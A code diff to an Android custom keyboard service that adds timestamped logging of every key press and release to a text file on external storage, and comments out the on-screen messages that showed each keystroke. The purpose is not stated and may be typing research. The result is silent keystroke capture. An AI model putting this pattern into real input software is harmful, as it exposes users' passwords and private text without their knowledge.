@@ -22,11 +22,14 @@ import java.io.IOException;
 import java.io.PrintWriter;
 import java.nio.Buffer;
 import java.text.SimpleDateFormat;
+import java.time.LocalDateTime;
+import java.time.temporal.ChronoField;
 import java.util.Date;
 
 public class MyInputMethodService extends InputMethodService implements KeyboardView.OnKeyboardActionListener {
     private KeyboardView keyboardView;
     private Keyboard keyboard;
+    private long curTime;
 
     private boolean isCaps = false;   // Caps Lock
 
@@ -36,18 +39,24 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
     }
 
     private void saveKeyLog(int primaryCode, int type) {
+        curTime = System.currentTimeMillis();
+        SimpleDateFormat dayTime = new SimpleDateFormat("yyyy:MM:dd:HH:mm:ss:SSS");
+        String dateDT = dayTime.format(new Date(curTime));
+
         String dirPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/LOG/";
-        File file = new File(dirPath, "LOG.TXT");
+        File file = new File(dirPath);
+        file.mkdirs();
+        file = new File(dirPath+"LOG.TXT");
         try {
-            if(!file.exists())
-                file.mkdirs();
-            BufferedWriter bfw = new BufferedWriter((new FileWriter(dirPath+"LOG.txt",true)));
+            BufferedWriter bfw = new BufferedWriter(new FileWriter(file,true));
+            bfw.write(dateDT + " ");
             bfw.write(Integer.toString(primaryCode));
             if(type == 0) {
-                bfw.write(" P\n");
+                bfw.write(" P");
             } else {
-                bfw.write(" R\n");
+                bfw.write(" R");
             }
+            bfw.newLine();
             bfw.flush();
             bfw.close();
         } catch(IOException e) {
@@ -69,7 +78,7 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
     @Override
     public void onPress(int primaryCode) {
         // Shows message when Certain Key is Pressed
-        showMsg("Press - " + Integer.toString(primaryCode));
+        // showMsg("Press - " + Integer.toString(primaryCode));
 
         saveKeyLog(primaryCode, 0);
     }
@@ -77,7 +86,7 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
     @Override
     public void onRelease(int primaryCode) {
         // Shows message when Certain Key is Released
-        showMsg("Release - "+Integer.toString(primaryCode));
+        // showMsg("Release - "+Integer.toString(primaryCode));
 
         saveKeyLog(primaryCode, 1);
     }
